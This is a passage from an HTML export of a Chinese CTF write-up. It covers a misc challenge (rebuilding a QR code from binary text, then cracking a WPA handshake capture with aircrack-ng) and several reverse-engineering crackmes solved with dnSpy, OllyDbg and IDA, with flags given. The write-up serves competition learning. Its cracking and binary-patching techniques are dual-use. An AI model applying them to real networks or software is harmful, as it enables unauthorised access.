+</code></pre><p>然后能分辨出这是个二维码：</p><p><img src="http://chuantu.biz/t6/127/1509859902x2101804615.png" alt=""></p><p>用python PIL库绘制出二维码：</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
+
+im = Image.new(<span class="hljs-string">'RGB'</span>,(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>),<span class="hljs-number">0xffffff</span>)
+im.save(<span class="hljs-string">'blank.png'</span>,<span class="hljs-string">'PNG'</span>)
+img = Image.open(<span class="hljs-string">'blank.png'</span>)
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'asd.txt'</span>) <span class="hljs-keyword">as</span> f:
+    con = f.read()
+x,y,i = <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>
+length = len(con)
+
+<span class="hljs-keyword">while</span> i&lt;length:
+    <span class="hljs-keyword">if</span> con[i] == <span class="hljs-string">'\n'</span>:
+        y+=<span class="hljs-number">1</span>
+        x=<span class="hljs-number">0</span>
+        i+=<span class="hljs-number">1</span>
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">elif</span> con[i]== <span class="hljs-string">'0'</span>:
+        img.putpixel((x,y),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))
+    <span class="hljs-keyword">elif</span> con[i]== <span class="hljs-string">'1'</span>:
+        img.putpixel((x,y),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
+    i+=<span class="hljs-number">1</span>
+    x+=<span class="hljs-number">1</span>
+img.save(<span class="hljs-string">'qr.png'</span>)
+</code></pre><p><img src="http://chuantu.biz/t6/127/1509860089x2101804615.png" alt=""></p><p>扫描得到一串aaencode，放chrome console里跑一下：</p><p><img src="http://chuantu.biz/t6/127/1509860252x2101804615.png" alt=""></p><p>是一串不完整的密文，看的出来是base32，生成字典跑wpa握手包：</p><pre><code class="bash hljs">root@kali:~/Desktop<span class="hljs-comment"># aircrack-ng lock.cap -w dict.txt</span>
+</code></pre><p>密码为 O42G4R3MOUYGYMJUJZGTGTTHGEYDCM27KNQWSS3POU====== ，<br>
+base32解码后 <strong>w4nGlu0l14NM3Ng1013_SaiKou</strong>，<br>
+然后打开flag.zip解压可得flag：<br>
+<strong>flag{D3c0de_1t_4Nd_Cr4Ck_1t}</strong></p><h2 id="re"><a class="anchor hidden-xs" href="#re" title="re"><span class="octicon octicon-link"></span></a>RE</h2><h2 id="cm50"><a class="anchor hidden-xs" href="#cm50" title="cm50"><span class="octicon octicon-link"></span></a>CM50</h2><p>查壳发现是C#的那就，且没加壳或者混淆，那就直接祭出Dnspy，通过搜索关键字符，来到关键处。</p><p><img src="/uploads/upload_30bbc4128b50608686ace37de4c09fc0.png" alt=""></p><p>然后发现如果输入长度不为5错误，我们按钮按下的值与4异或不等于contrast的值错误。<br>
+所以最后得到需要输入08067然后得到flag：greet_08067<br>
+<img src="/uploads/upload_50e1bc826a28e29d3937bdf68d9d3aca.png" alt=""></p><h2 id="cm100"><a class="anchor hidden-xs" href="#cm100" title="cm100"><span class="octicon octicon-link"></span></a>CM100</h2><p>MFC程序无壳，有输入，那就直接下GetWinodowTextA 断点。然后然后回溯来到关键位置。<br>
+输入后会首先判断输入文本长度是否与16相等。<br>
+<img src="/uploads/upload_4adc1a51b14a279381d192d94b013e4a.png" alt=""></p><p>继续向下就能找到关键跳转和关键CALL：<br>
+<img src="/uploads/upload_d01fa3baa65c67c7c5e777e0f10881a0.png" alt=""></p><p>记下地址后，利用IAD分析：<br>
+<img src="/uploads/upload_662d9a1973e1d1feb70b7fd35a69b517.png" alt=""></p><p>交换完成后与”1H@Y1S0718760Dm3”做按位比较，如果全部相等则OK。<br>
+那么变逆算法（直接贴代码）：</p><pre><code class="clike hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span></div><div class="code"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+	<span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">"1H@Y1S0718760Dm3"</span>;
+	<span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(flag);
+	<span class="hljs-keyword">char</span> tmp;
+	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = len<span class="hljs-number">-3</span>; i<span class="hljs-number">-2</span> &gt;= <span class="hljs-number">-1</span>; i-=<span class="hljs-number">2</span>)
+	{
+		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = len<span class="hljs-number">-4</span>; j<span class="hljs-number">-4</span> &gt;= <span class="hljs-number">-3</span>; j-=<span class="hljs-number">4</span>)
+		{
+			tmp = flag[j];
+			flag[j] = flag[j - <span class="hljs-number">4</span>];
+			flag[j - <span class="hljs-number">4</span>] = tmp;
+		}
+		tmp = flag[i];
+		flag[i] = flag[i <span class="hljs-number">-1</span>];
+		flag[i<span class="hljs-number">-1</span>] = tmp;
+	}
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, flag);
+	system(<span class="hljs-string">"pause"</span>);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</div></div></code></pre><p>最后得到flag：H1Y@D1708067S1m3</p><h2 id="cm200"><a class="anchor hidden-xs" href="#cm200" title="cm200"><span class="octicon octicon-link"></span></a>CM200</h2><p>RE200其实通过是不会出现flag的，因为通关没有显示分值的那个页面，那这题要怎么做呢，用IDA看下字符窜，发现有08067，跟过去看看。其实多交叉调用几次你就能找到关键的地方。<br>
+<img src="/uploads/upload_bf7757f124a8ae0f4624703ca8a097e2.png" alt=""></p><p>然后直接在OD中调用该CALL<br>
+<img src="/uploads/upload_01d5c6230efc889b6abd5f66b98af9d3.png" alt=""></p><p>然后flag就出来了：<br>
+<img src="/uploads/upload_2bec6c116a2f5bbcfffe9a893a1837c4.png" alt=""><br>
+flag：S1M308067</p><h2 id="cm300"><a class="anchor hidden-xs" href="#cm300" title="cm300"><span class="octicon octicon-link"></span></a>CM300</h2><p>先用PEid查下壳，再用插件看一下用没用加密算法：<br>
+<img src="/uploads/upload_90c773e9d4ca14c65ea93f65506c4d4c.png" alt=""></p><p>无壳但是利用了DES加密算法，利用IDA确定加密算法用到的位置<br>
+<img src="/uploads/upload_b3ab69aab3b3f76d6783ce4b7536362c.png" alt=""></p><p>记下地址之后，我们就开始过按钮的移动，再MFC中对于鼠标消息的处理有专门的函数，所以我们只要找到这个函数（利用GetWindowRect）然后段首retn就可以了。<br>
+<img src="/uploads/upload_a4a038f4699c7f537d69bdf4beb05e45.png" alt=""></p><p>因为DES 的加密函数和解密函数是相同的只是秘钥的顺序由原来的k1<sub>k16变为了k16</sub>k1<br>
+，所以我们利用这个特性就能快速解题了.<br>
+先在OD中跟到DES的位置：<br>
+<img src="/uploads/upload_d3b89c27a88dfefc4b2e22073243d708.png" alt=""></p><p>然后找到key：<br>
+<img src="/uploads/upload_94216eadd20ab1ffc8847000450a92bf.png" alt=""></p><p>对key值进行交换：<br>
+<img src="/uploads/upload_4f56ee3f514a431dd9f4f41d47ba8705.png" alt=""></p><p>因为最后与A8 13 9C DB 0E A5 9C 6C直接做比较，所以我们将我们的输入替换成A8 13 9C DB 0E A5 9C 6C，然后调用DESFunc：<br>
+<img src="/uploads/upload_87b9636f66fec5a4a43b058db5af1ba8.png" alt=""></p><p>最后得到flag：aHa_St0p</p><h2 id="cm400"><a class="anchor hidden-xs" href="#cm400" title="cm400"><span class="octicon octicon-link"></span></a>CM400</h2><p>该题是VM代码段，但是没有加壳，版本是2.08，找到关键CALL后需要师傅们自己还原VM代码，这里就不做还原了（水平有限），就直接贴关键位置的源码了：</p><pre><code class="clojure hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span></div><div class="code"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Math11</span><span class="hljs-params">(BYTE *Data)</span>
+</span>{
+	<span class="hljs-keyword">int</span> x, y, m, n;
+	x = Data[<span class="hljs-number">0</span>] * <span class="hljs-number">1000</span> + Data[<span class="hljs-number">1</span>] * <span class="hljs-number">100</span> + Data[<span class="hljs-number">2</span>] * <span class="hljs-number">10</span> + Data[<span class="hljs-number">3</span>];
+	y = Data[<span class="hljs-number">4</span>] * <span class="hljs-number">1000</span> + Data[<span class="hljs-number">5</span>] * <span class="hljs-number">100</span> + Data[<span class="hljs-number">6</span>] * <span class="hljs-number">10</span> + Data[<span class="hljs-number">7</span>];
+	m = Data[<span class="hljs-number">8</span>] * <span class="hljs-number">1000</span> + Data[<span class="hljs-number">9</span>] * <span class="hljs-number">100</span> + Data[<span class="hljs-number">10</span>] * <span class="hljs-number">10</span> + Data[<span class="hljs-number">11</span>];
+	n = Data[<span class="hljs-number">12</span>] * <span class="hljs-number">1000</span> + Data[<span class="hljs-number">13</span>] * <span class="hljs-number">100</span> + Data[<span class="hljs-number">14</span>] * <span class="hljs-number">10</span> + Data[<span class="hljs-number">15</span>];
+	<span class="hljs-keyword">int</span> a = <span class="hljs-number">78041</span>, b = <span class="hljs-number">68335</span>, c = <span class="hljs-number">72299</span>, d = <span class="hljs-number">48000</span>;
+	<span class="hljs-keyword">if</span> ((<span class="hljs-number">5</span> * x + <span class="hljs-number">4</span> * y + <span class="hljs-number">3</span> * m + <span class="hljs-number">2</span> * n) != a)
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+	<span class="hljs-keyword">if</span> ((<span class="hljs-number">4</span> * x + <span class="hljs-number">2</span> * y + <span class="hljs-number">6</span> * m + <span class="hljs-number">3</span> * n) != b)
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+	<span class="hljs-keyword">if</span> ((<span class="hljs-number">3</span> * x + y + <span class="hljs-number">7</span> * m + <span class="hljs-number">5</span> * n) != c)
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+	<span class="hljs-keyword">if</span> ((<span class="hljs-number">2</span> * x + <span class="hljs-number">3</span> * y + <span class="hljs-number">5</span> * m + n) != d)
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+}
+</div></div></code></pre><p>最后解方程便能得到flag：5457782311108067</p><h2 id="apk02"><a class="anchor hidden-xs" href="#apk02" title="apk02"><span class="octicon octicon-link"></span></a>Apk02</h2><p>用改之理打开可以看见有个so加密文件<br>
+<img src="/uploads/upload_bb9b769196b09ebce39999b3edba9609.png" alt=""><br>
+放到IDA里面去看，找到程序入口点进去F5自后可以看见就是一个 就是一个明文比较<br>
+<img src="/uploads/upload_6d793bc92ac7451769cff53a39e7a6dd.png" alt=""><br>
+最后得出flag：KnAvE</p></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav"><li class=""><a href="#swpu-wp">swpu wp</a><ul class="nav"><li class=""><a href="#web">web</a><ul class="nav"><li class=""><a href="#你能进入后台吗？">你能进入后台吗？</a></li><li><a href="#flagflag">flag!flag</a></li><li><a href="#我们来做个小游戏吧">我们来做个小游戏吧</a></li><li><a href="#you-think-i-think">You Think I Think</a></li><li><a href="#catch-me-if-you-can">catch me if you can</a></li><li><a href="#偷懒的出题人">偷懒的出题人</a></li><li><a href="#python-sandbox">python sandbox</a></li><li><a href="#师傅们一起来找flag">师傅们一起来找flag</a></li></ul></li><li><a href="#pwn">pwn</a></li><li><a href="#misc">misc</a><ul class="nav"><li><a href="#我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s">我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s</a></li><li><a href="#我为祖国献代码">我为祖国献代码</a></li><li><a href="#爆照！！！！">爆照！！！！</a></li><li><a href="#俄罗斯套娃">俄罗斯套娃</a></li></ul></li><li><a href="#re">RE</a></li><li><a href="#cm50">CM50</a></li><li><a href="#cm100">CM100</a></li><li><a href="#cm200">CM200</a></li><li><a href="#cm300">CM300</a></li><li><a href="#cm400">CM400</a></li><li><a href="#apk02">Apk02</a></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
+        <div class="toc"><ul class="nav"><li class=""><a href="#swpu-wp">swpu wp</a><ul class="nav"><li class=""><a href="#web">web</a><ul class="nav"><li class=""><a href="#你能进入后台吗？">你能进入后台吗？</a></li><li><a href="#flagflag">flag!flag</a></li><li><a href="#我们来做个小游戏吧">我们来做个小游戏吧</a></li><li><a href="#you-think-i-think">You Think I Think</a></li><li><a href="#catch-me-if-you-can">catch me if you can</a></li><li><a href="#偷懒的出题人">偷懒的出题人</a></li><li><a href="#python-sandbox">python sandbox</a></li><li><a href="#师傅们一起来找flag">师傅们一起来找flag</a></li></ul></li><li><a href="#pwn">pwn</a></li><li><a href="#misc">misc</a><ul class="nav"><li><a href="#我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s">我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s</a></li><li><a href="#我为祖国献代码">我为祖国献代码</a></li><li><a href="#爆照！！！！">爆照！！！！</a></li><li><a href="#俄罗斯套娃">俄罗斯套娃</a></li></ul></li><li><a href="#re">RE</a></li><li><a href="#cm50">CM50</a></li><li><a href="#cm100">CM100</a></li><li><a href="#cm200">CM200</a></li><li><a href="#cm300">CM300</a></li><li><a href="#cm400">CM400</a></li><li><a href="#apk02">Apk02</a></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
+    <script>
+        var markdown = $(".markdown-body");
+        //smooth all hash trigger scrolling
+        function smoothHashScroll() {
+            var hashElements = $("a[href^='#']").toArray();
+            for (var i = 0; i < hashElements.length; i++) {
+                var element = hashElements[i];
+                var $element = $(element);
+                var hash = element.hash;
+                if (hash) {
+                    $element.on('click', function (e) {
+                        // store hash
+                        var hash = this.hash;
+                        if ($(hash).length <= 0) return;
+                        // prevent default anchor click behavior
+                        e.preventDefault();
+                        // animate
+                        $('body, html').stop(true, true).animate({
+                            scrollTop: $(hash).offset().top
+                        }, 100, "linear", function () {
+                            // when done, add hash to url
+                            // (default click behaviour)
+                            window.location.hash = hash;
+                        });
+                    });
+                }
+            }
+        }
+
+        smoothHashScroll();
+        var toc = $('.ui-toc');
+        var tocAffix = $('.ui-affix-toc');
+        var tocDropdown = $('.ui-toc-dropdown');
+        //toc
+        tocDropdown.click(function (e) {
+            e.stopPropagation();
+        });
+
+        var enoughForAffixToc = true;
+
+        function generateScrollspy() {
+            $(document.body).scrollspy({
+                target: ''
+            });
+            $(document.body).scrollspy('refresh');
+            if (enoughForAffixToc) {
+                toc.hide();
+                tocAffix.show();
+            } else {
+                tocAffix.hide();
+                toc.show();
+            }
+            $(document.body).scroll();
+        }
+
+        function windowResize() {
+            //toc right
+            var paddingRight = parseFloat(markdown.css('padding-right'));
+            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
+            toc.css('right', right + 'px');
+            //affix toc left
+            var newbool;
+            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
+            //for ipad or wider device
+            if (rightMargin >= 133) {
+                newbool = true;
+                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
+                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
+                tocAffix.css('left', left + 'px');
+            } else {
+                newbool = false;
+            }
+            if (newbool != enoughForAffixToc) {
+                enoughForAffixToc = newbool;
+                generateScrollspy();
+            }
+        }
+        $(window).resize(function () {
+            windowResize();
+        });
+        $(document).ready(function () {
+            windowResize();
+            generateScrollspy();
+        });
+
+        //remove hash
+        function removeHash() {
+            window.location.hash = '';
+        }
+
+        var backtotop = $('.back-to-top');
+        var gotobottom = $('.go-to-bottom');
+
+        backtotop.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToTop)
+                scrollToTop();
+            removeHash();
+        });
+        gotobottom.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (scrollToBottom)
+                scrollToBottom();
+            removeHash();
+        });
+
+        var toggle = $('.expand-toggle');
+        var tocExpand = false;
+
+        checkExpandToggle();
+        toggle.click(function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            tocExpand = !tocExpand;
+            checkExpandToggle();
+        })
+
+        function checkExpandToggle () {
+            var toc = $('.ui-toc-dropdown .toc');
+            var toggle = $('.expand-toggle');
+            if (!tocExpand) {
+                toc.removeClass('expand');
+                toggle.text('Expand all');
+            } else {
+                toc.addClass('expand');
+                toggle.text('Collapse all');
+            }
+        }
+
+        function scrollToTop() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: 0
+            }, 100, "linear");
+        }
+
+        function scrollToBottom() {
+            $('body, html').stop(true, true).animate({
+                scrollTop: $(document.body)[0].scrollHeight
+            }, 100, "linear");
+        }
+    </script>
+</body>
+
+</html>
